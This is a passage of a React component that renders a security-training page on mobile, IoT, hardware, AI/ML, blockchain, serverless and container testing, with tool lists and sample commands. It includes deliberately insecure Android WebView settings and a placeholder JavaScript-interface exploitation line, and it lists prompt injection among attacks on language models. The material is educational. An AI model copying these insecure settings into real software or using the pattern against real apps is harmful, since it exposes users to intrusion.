                        <li><strong>Objection:</strong> Runtime mobile exploration</li>
                        <li><strong>Frida:</strong> Dynamic analysis toolkit</li>
                      </ul>
                    </div>
                  </div>
                  
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">WebView Security Testing</h5>
                    <div className="bg-black/40 p-4 rounded-lg font-mono text-sm">
                      <div className="text-green-400">{`// Android WebView Vulnerabilities`}</div>
                      <div>{`webView.getSettings().setJavaScriptEnabled(true);`}</div>
                      <div>{`webView.getSettings().setAllowFileAccess(true);`}</div>
                      <div>{`webView.addJavascriptInterface(new WebAppInterface(this), "Android");`}</div>
                      <div className="text-green-400 mt-3">{`// JavaScript Interface Exploitation`}</div>
                      <div>{`<script>Android.method("malicious_payload");</script>`}</div>
                      <div className="text-green-400 mt-3">{`// File URI Exploitation`}</div>
                      <div>{`file:///android_asset/`}</div>
                      <div>{`content://`}</div>
                    </div>
                  </div>
                </div>
              </Card>

              {/* IoT Security */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">IoT Web Interface Security</h4>
                <div className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <h5 className="font-medium mb-3 text-cybr-primary">IoT Attack Vectors</h5>
                      <ul className="space-y-2 text-sm">
                        <li><strong>Default Credentials:</strong> Manufacturer defaults, weak policies</li>
                        <li><strong>Firmware Exploitation:</strong> Extraction, reverse engineering</li>
                        <li><strong>Communication Protocols:</strong> HTTP/HTTPS flaws, WebSocket issues</li>
                        <li><strong>Device Management:</strong> Web panels, API endpoints</li>
                        <li><strong>Command Injection:</strong> Device control exploitation</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-3 text-cybr-primary">IoT Security Tools</h5>
                      <ul className="space-y-2 text-sm">
                        <li><strong>Firmware Analysis Toolkit:</strong> FAT framework</li>
                        <li><strong>Binwalk:</strong> Firmware extraction tool</li>
                        <li><strong>Firmwalker:</strong> Firmware analysis</li>
                        <li><strong>EMBA:</strong> Embedded analyzer</li>
                        <li><strong>IoT Inspector:</strong> Dynamic analysis</li>
                      </ul>
                    </div>
                  </div>
                  
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">Hardware Security Testing</h5>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
                      <div>
                        <strong>Hardware Interfaces:</strong>
                        <ul className="mt-1 space-y-1">
                          <li>• UART/Serial console access</li>
                          <li>• JTAG debug port discovery</li>
                          <li>• SPI/I2C communication</li>
                          <li>• Flash memory extraction</li>
                        </ul>
                      </div>
                      <div>
                        <strong>Side-Channel Attacks:</strong>
                        <ul className="mt-1 space-y-1">
                          <li>• Power analysis attacks</li>
                          <li>• Electromagnetic emission analysis</li>
                          <li>• Timing attack exploitation</li>
                          <li>• Acoustic cryptanalysis</li>
                        </ul>
                      </div>
                    </div>
                  </div>
                </div>
              </Card>
            </div>
          </AccordionContent>
        </AccordionItem>

        {/* Advanced Research */}
        <AccordionItem value="advanced-research">
          <AccordionTrigger className="text-xl font-semibold flex items-center gap-2">
            <FileSearch className="h-6 w-6 text-cybr-primary" />
            Advanced Research & Emerging Threats
          </AccordionTrigger>
          <AccordionContent>
            <div className="space-y-6">
              {/* Emerging Technologies */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">Cutting-Edge Security Research</h4>
                <div className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <h5 className="font-medium mb-3 text-cybr-primary">AI/ML Security Testing</h5>
                      <ul className="space-y-2 text-sm">
                        <li><strong>Adversarial Attacks:</strong> Model poisoning, evasion attacks</li>
                        <li><strong>Model Inversion:</strong> Data extraction from trained models</li>
                        <li><strong>Membership Inference:</strong> Training data identification</li>
                        <li><strong>Prompt Injection:</strong> LLM manipulation techniques</li>
                        <li><strong>AI Security Tools:</strong> Foolbox, CleverHans, ART</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-3 text-cybr-primary">Blockchain Security</h5>
                      <ul className="space-y-2 text-sm">
                        <li><strong>Smart Contract Auditing:</strong> Solidity vulnerability analysis</li>
                        <li><strong>DeFi Protocol Testing:</strong> Flash loan attacks, MEV</li>
                        <li><strong>Consensus Attacks:</strong> 51% attacks, long-range attacks</li>
                        <li><strong>Web3 Security:</strong> Wallet integration vulnerabilities</li>
                        <li><strong>Analysis Tools:</strong> Mythril, Slither, Echidna</li>
                      </ul>
                    </div>
                  </div>
                  
                  <Separator />
                  
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">Serverless Security Testing</h5>
                    <div className="bg-black/40 p-4 rounded-lg font-mono text-sm">
                      <div className="text-blue-400">{`# AWS Lambda Security Testing`}</div>
                      <div>{`# Cold start exploitation`}</div>
                      <div>{`# Function enumeration`}</div>
                      <div>{`# Environment variable exposure`}</div>
                      <div>{`# Dependency vulnerabilities`}</div>
                      <div className="mt-3 text-blue-400">{`# Serverless Security Tools`}</div>
                      <div>{`npm install -g @puresec/cli`}</div>
                      <div>{`puresec gen-roles --function lambda-function`}</div>
                      <div>{`pip install lambda-guard`}</div>
                      <div>{`lambda-guard scan function.zip`}</div>
                    </div>
                  </div>
                </div>
              </Card>

              {/* Container Security */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">Container & Microservices Security</h4>
                <div className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <h5 className="font-medium mb-3 text-cybr-primary">Container Security Assessment</h5>
                      <ul className="space-y-2 text-sm">
                        <li><strong>Image Vulnerabilities:</strong> Base image scanning, dependency analysis</li>
                        <li><strong>Runtime Security:</strong> Container escape techniques</li>
                        <li><strong>Registry Security:</strong> Docker Hub, private registry testing</li>
                        <li><strong>Orchestration:</strong> Kubernetes security configuration</li>
                        <li><strong>Network Policies:</strong> Service mesh security testing</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-3 text-cybr-primary">Container Security Tools</h5>
                      <ul className="space-y-2 text-sm">
                        <li><strong>Clair:</strong> Container vulnerability scanner</li>
                        <li><strong>Trivy:</strong> Comprehensive security scanner</li>
                        <li><strong>Falco:</strong> Runtime security monitoring</li>
                        <li><strong>Docker Bench:</strong> Security configuration checker</li>
                        <li><strong>Kube-hunter:</strong> Kubernetes penetration testing</li>
                      </ul>
                    </div>
                  </div>
                  
                  <div className="bg-black/40 p-4 rounded-lg font-mono text-sm">
                    <div className="text-yellow-400">{`# Container Security Commands`}</div>
                    <div>{`docker run -it --net host --pid host --userns host --cap-add audit_control \\`}</div>
                    <div>{`  -v /var/run/docker.sock:/var/run/docker.sock:ro \\`}</div>
                    <div>{`  docker/docker-bench-security`}</div>
                    <div className="mt-2">{`trivy image nginx:latest`}</div>
                    <div>{`sudo falco`}</div>
                  </div>
                </div>
              </Card>

              {/* Zero-Day Research */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">Zero-Day Research Methodology</h4>
                <div className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div>
                      <h5 className="font-medium text-cybr-primary mb-2">Research Process</h5>
                      <ul className="text-sm space-y-1">
                        <li>• Target identification</li>
                        <li>• Code review and analysis</li>
                        <li>• Fuzzing and testing</li>
                        <li>• Proof-of-concept development</li>
                        <li>• Responsible disclosure</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium text-cybr-primary mb-2">Analysis Tools</h5>
                      <ul className="text-sm space-y-1">
                        <li>• Static analysis tools</li>
                        <li>• Dynamic analysis platforms</li>
                        <li>• Reverse engineering tools</li>
                        <li>• Debugging frameworks</li>
                        <li>• Exploitation libraries</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium text-cybr-primary mb-2">Bug Bounty Programs</h5>
                      <ul className="text-sm space-y-1">
                        <li>• HackerOne platform</li>
                        <li>• Bugcrowd programs</li>
                        <li>• Private programs</li>
                        <li>• Coordinated disclosure</li>
                        <li>• CVE assignment process</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </Card>
            </div>
          </AccordionContent>
        </AccordionItem>
      </Accordion>
    </div>
  );
};

export default AdvancedContentSection;
